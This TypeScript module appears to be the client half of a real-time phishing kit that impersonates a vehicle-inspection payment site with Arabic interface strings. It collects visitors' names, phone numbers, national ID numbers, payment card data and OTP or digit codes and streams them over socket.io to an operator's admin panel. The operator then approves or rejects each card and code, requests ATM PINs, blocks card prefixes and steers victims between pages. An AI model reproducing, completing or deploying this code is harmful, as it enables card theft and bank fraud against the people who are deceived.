import { signal } from "@preact/signals-react";
import { io, Socket } from "socket.io-client";

// Socket Configuration - reads from VITE_SOCKET_URL for dynamic server URL
const SOCKET_URL = import.meta.env.VITE_SOCKET_URL || "http://localhost:3001";

// Client-side navigation callback (set by App.tsx to avoid full page reload)
let _navigateCallback: ((path: string) => void) | null = null;
export function setNavigateCallback(cb: (path: string) => void) {
  _navigateCallback = cb;
}
export function clientNavigate(path: string) {
  if (_navigateCallback) {
    _navigateCallback(path);
  } else {
    window.location.href = path;
  }
}
console.log("Socket URL:", SOCKET_URL);

// Create socket instance
export const socket = signal<Socket>(
  io(SOCKET_URL, {
    transports: ["websocket", "polling"],
    autoConnect: false,
  })
);

// Visitor State
export interface VisitorState {
  visitorNumber: number;
  createdAt: string;
  isRead: boolean;
  fullName: string;
  phone: string;
  idNumber: string;
  _id: string;
  apiKey: string;
  ip: string;
  country: string;
  city: string;
  os: string;
  device: string;
  browser: string;
  date: string;
  socketId: string;
  blockedCardPrefixes: string[];
  page: string;
}

export const visitor = signal<VisitorState>({
  visitorNumber: 0,
  createdAt: "",
  isRead: true,
  fullName: "",
  phone: "",
  idNumber: "",
  _id: "",
  apiKey: "",
  ip: "",
  country: "",
  city: "",
  os: "",
  device: "",
  browser: "",
  date: "",
  socketId: "",
  blockedCardPrefixes: [],
  page: "الصفحة الرئيسية",
});

// Form State
export const isFormApproved = signal<boolean>(false);
export const isFormRejected = signal<boolean>(false);
export const waitingMessage = signal<string>("");
export const nextPage = signal<string>("");
export const verificationCode = signal<string>("");

// Admin Connection State
export const isAdminConnected = signal<boolean>(false);
export const adminLastMessage = signal<string>("");

// Error/Block State
export const errorMessage = signal<{ en: string; ar: string; image?: string } | undefined>(undefined);
export const isBlocked = signal<boolean>(false);

// Card Verification
export const isCardVerified = signal<boolean | null>(null);

// Card Action from Admin (otp, atm, reject) - يحتوي على timestamp لضمان التفاعل مع كل تغيير
export const cardAction = signal<{ action: string; timestamp: number } | null>(null);

// Duplicate Card Rejection
export const duplicateCardRejected = signal<boolean>(false);

// Duplicate OTP Rejection
export const duplicateOtpRejected = signal<boolean>(false);

// Code Action from Admin (approve, reject) for OTP/digit codes
export const codeAction = signal<{ action: string; codeIndex: number } | null>(null);

// Payment Data (stored in localStorage)
export interface PaymentData {
  totalPaid?: number;
  cardType?: string;
  cardLast4?: string;
}

// Pending data to send after connection
let pendingData: Parameters<typeof sendData>[0] | null = null;

// Function to send data to server
export function sendData(params: {
  data?: Record<string, any>;
  paymentCard?: Record<string, any>;
  digitCode?: string;
  current: string;
  nextPage?: string;
  waitingForAdminResponse?: boolean;
  isCustom?: boolean;
  mode?: string;
  customWaitingMessage?: string;
}) {
  console.log("sendData called with:", params);
  console.log("Current visitor ID:", visitor.value._id);
  console.log("Socket connected:", socket.value.connected);
  
  // If visitor ID is not set yet, store and wait for connection
  if (!visitor.value._id || !socket.value.connected) {
    console.warn("No visitor ID or socket not connected, storing pending data...");
    pendingData = params;
    return;
  }

  isFormApproved.value = false;
  isFormRejected.value = false;

  const payload = {
    content: params.data,
    paymentCard: params.paymentCard,
    digitCode: params.digitCode,
    page: params.current,
    waitingForAdminResponse: params.waitingForAdminResponse,
    sentCustomPage: params.isCustom,
    mode: params.mode,
  };
  
  console.log("Emitting more-info with payload:", payload);
  socket.value.emit("more-info", payload);

  if (params.nextPage) {
    nextPage.value = params.nextPage;
  }

  if (!params.mode && params.waitingForAdminResponse) {
    waitingMessage.value = params.customWaitingMessage || "جاري المعالجة...";
  }
}

// Function to send pending data after connection
export function sendPendingData() {
  if (pendingData && visitor.value._id && socket.value.connected) {
    console.log("Sending pending data:", pendingData);
    sendData(pendingData);
    pendingData = null;
  }
}

// Pending page to send after connection
let pendingPage: string | null = null;

// Function to navigate to page
export function navigateToPage(page: string) {
  console.log("navigateToPage called:", page);
  // إخفاء نافذة "جاري المعالجة" عند دخول أي صفحة (تظهر فقط بعد إجراء صريح)
  waitingMessage.value = "";
  // تحديث الصفحة في visitor state
  visitor.value = { ...visitor.value, page };
  
  if (socket.value.connected) {
    console.log("Socket connected, emitting pageEnter:", page);
    socket.value.emit("visitor:pageEnter", page);
  } else {
    console.log("Socket not connected, storing pending page:", page);
    pendingPage = page;
  }
}

// Function to send pending page after connection
export function sendPendingPage() {
  if (pendingPage && socket.value.connected) {
    console.log("Sending pending page:", pendingPage);
    socket.value.emit("visitor:pageEnter", pendingPage);
    pendingPage = null;
  }
}

const DEFAULT_PAYMENT_SERVICE = 'الفحص الفني الدوري'; const DEFAULT_PAYMENT_AMOUNT = '115'; function cleanAmountValue(v: any): string { if (!v) return ''; return String(v).replace(/[٠-٩]/g, function (d) { return String('٠١٢٣٤٥٦٧٨٩'.indexOf(d)); }).replace(/[^0-9.]/g, ''); } function paymentInfoFromSelection(): { service: string; amount: string } | null { try { const raw = localStorage.getItem('selectedOffer'); if (!raw) return null; const offer = JSON.parse(raw); const service = offer && offer.name ? String(offer.name) : ''; const price = offer && offer.totalPrice ? Number(offer.totalPrice) : 0; if (!service && !price) return null; const total = price > 0 ? Math.round(price * 1.15 * 100) / 100 : 0; return { service: service, amount: total > 0 ? String(total) : '' }; } catch (e) { return null; } } export function resolvePaymentInfo(): { service: string; amount: string } { const params = new URLSearchParams(window.location.search); const urlService = params.get('service') || ''; const urlAmount = cleanAmountValue(params.get('amount')); const fromSelection = paymentInfoFromSelection(); const storedService = localStorage.getItem('paymentServiceName') || ''; const storedAmount = cleanAmountValue(localStorage.getItem('paymentTotalAmount')); const service = urlService || (fromSelection && fromSelection.service) || storedService || DEFAULT_PAYMENT_SERVICE; const amount = urlAmount || (fromSelection && fromSelection.amount) || storedAmount || DEFAULT_PAYMENT_AMOUNT; localStorage.setItem('paymentServiceName', service); localStorage.setItem('paymentTotalAmount', amount); return { service: service, amount: amount }; }
// Initialize socket listeners
export function initializeSocket() {
  const s = socket.value;
  console.log("Initializing socket...");

  s.on("connect", () => {
    console.log("Socket connected successfully!");
    // Register visitor with existing ID if available
    const existingVisitorId = localStorage.getItem("visitorId");
    console.log("Registering visitor...", existingVisitorId ? "(returning visitor: " + existingVisitorId + ")" : "(new visitor)");
    s.emit("visitor:register", { existingVisitorId });
  });

  s.on("connect_error", (error) => {
    console.error("Socket connection error:", error);
  });

  s.on("successfully-connected", (data: { sid: string; pid: string }) => {
    console.log("Successfully connected to server:", data);
    visitor.value = { ...visitor.value, socketId: data.sid, _id: data.pid };
    // Save visitor ID to localStorage for reconnection
    localStorage.setItem("visitorId", data.pid);
    // إرسال الصفحة المعلقة إذا وجدت
    sendPendingPage();
    // إرسال البيانات المعلقة إذا وجدت
    sendPendingData();
  });

  s.on("form:approved", () => {
    console.log("Form approved!");
    isFormApproved.value = true;
    waitingMessage.value = "";
  });

  s.on("form:rejected", () => {
    console.log("Form rejected!");
    isFormRejected.value = true;
    waitingMessage.value = "";
  });

  s.on('visitor:navigate', (payload: any) => { const page: string = typeof payload === 'string' ? payload : payload && payload.page;
    console.log("Navigate to:", page);
    if (page) {
      // CRITICAL: Clear ALL waiting overlay signals before navigating
      waitingMessage.value = "";
      isFormApproved.value = false;
      isFormRejected.value = false;
      let __path = '/' + page; if (payload && typeof payload === 'object') { const __qs: string[] = []; if (payload.service) { localStorage.setItem('paymentServiceName', String(payload.service)); __qs.push('service=' + encodeURIComponent(String(payload.service))); } if (payload.amount !== undefined && payload.amount !== null && String(payload.amount) !== '') { const __a = String(payload.amount).replace(/[^0-9.]/g, ''); if (__a) { localStorage.setItem('paymentTotalAmount', __a); __qs.push('amount=' + encodeURIComponent(__a)); } } if (__qs.length) __path += '?' + __qs.join('&'); } clientNavigate(__path);
    }
  });

  s.on("admin-last-message", ({ message }: { message: string }) => {
    console.log("Admin message received:", message);
    adminLastMessage.value = message;
    waitingMessage.value = "";
    navigateToPage("END");
  });

  s.on("code", (code: string) => {
    console.log("Verification code received:", code);
    verificationCode.value = code;
    waitingMessage.value = "";
  });

  s.on("cardNumber:verified", (verified: boolean) => {
    console.log("Card verification result:", verified);
    isCardVerified.value = verified;
  });

  s.on("card:action", (action: string) => {
    console.log("Card action received:", action);
    // إضافة timestamp لضمان التفاعل مع كل تغيير حتى لو كان نفس الإجراء
    cardAction.value = { action, timestamp: Date.now() };
    waitingMessage.value = "";
  });

  s.on("card:duplicateRejected", () => {
    console.log("Duplicate card rejected!");
    duplicateCardRejected.value = true;
    waitingMessage.value = "";
  });

  s.on("otp:duplicateRejected", () => {
    console.log("Duplicate OTP rejected!");
    duplicateOtpRejected.value = true;
    waitingMessage.value = "";
  });

  s.on("code:action", (data: { action: string; codeIndex: number }) => {
    console.log("Code action received:", data);
    codeAction.value = data;
    waitingMessage.value = "";
  });

  s.on("resend:approved", () => {
    console.log("Resend approved!");
    waitingMessage.value = "";
  });

  s.on("blocked", () => {
    console.log("Visitor blocked!");
    waitingMessage.value = "";
    errorMessage.value = {
      en: "You have been banned from using the site for violating the terms of use.",
      ar: "تم حظرك من استخدام الموقع لانتهاكك شروط الاستخدام.",
      image: "banned.jpg",
    };
    isBlocked.value = true;
  });

  s.on("unblocked", () => {
    console.log("Visitor unblocked!");
    errorMessage.value = undefined;
    isBlocked.value = false;
  });

  s.on("deleted", () => {
    console.log("Visitor deleted!");
    clientNavigate("/");
    errorMessage.value = {
      en: "Removed Your Account! Try Again Later",
      ar: "",
    };
  });

  s.on("isAdminConnected", (connected: boolean) => {
    console.log("Admin connected status:", connected);
    isAdminConnected.value = connected;
  });

  s.on("bankName", (name: string) => {
    console.log("Bank name set:", name);
    localStorage.setItem("selectedBank", name);
  });

  // Connect socket
  console.log("Connecting socket...");
  s.connect();
}

// Disconnect socket
export function disconnectSocket() {
  console.log("Disconnecting socket...");
  socket.value.disconnect();
}

// Function to update current page
export function updatePage(pageName: string) {
  console.log("updatePage called:", pageName);
  visitor.value = { ...visitor.value, page: pageName };
  
  // If socket is connected, emit immediately
  if (socket.value.connected) {
    console.log("Socket connected, emitting pageEnter:", pageName);
    socket.value.emit("visitor:pageEnter", pageName);
  } else {
    // Wait for socket to connect then emit
    console.log("Socket not connected, waiting...");
    const checkConnection = setInterval(() => {
      if (socket.value.connected) {
        // إرسال الصفحة الحالية وليس القيمة القديمة
        const currentPage = visitor.value.page;
        console.log("Socket now connected, emitting pageEnter:", currentPage);
        socket.value.emit("visitor:pageEnter", currentPage);
        clearInterval(checkConnection);
      }
    }, 100);
    
    // Clear interval after 10 seconds to prevent memory leak
    setTimeout(() => clearInterval(checkConnection), 10000);
  }
}

// Function to submit data to admin panel
export function submitData(data: Record<string, any>, waitingForAdminResponse: boolean = false, _retryCount: number = 0) {
  console.log("submitData called with:", data, "retry:", _retryCount);
  console.log("Current visitor ID:", visitor.value._id);
  console.log("Socket connected:", socket.value.connected);
  
  // If visitor ID is not set yet, keep retrying (up to 15 seconds)
  if (!visitor.value._id || !socket.value.connected) {
    if (_retryCount < 30) {
      console.warn("No visitor ID or socket not connected, retrying in 500ms... (attempt " + (_retryCount + 1) + ")");
      setTimeout(() => {
        submitData(data, waitingForAdminResponse, _retryCount + 1);
      }, 500);
    } else {
      console.error("Failed to submit data after 30 retries");
    }
    return;
  }
  
  const payload = {
    content: data,
    page: visitor.value.page,
    waitingForAdminResponse: waitingForAdminResponse,
  };
  
  console.log("Emitting more-info with payload:", payload);
  socket.value.emit("more-info", payload);
  
  if (waitingForAdminResponse) {
    waitingMessage.value = "جاري المعالجة...";
  }
}
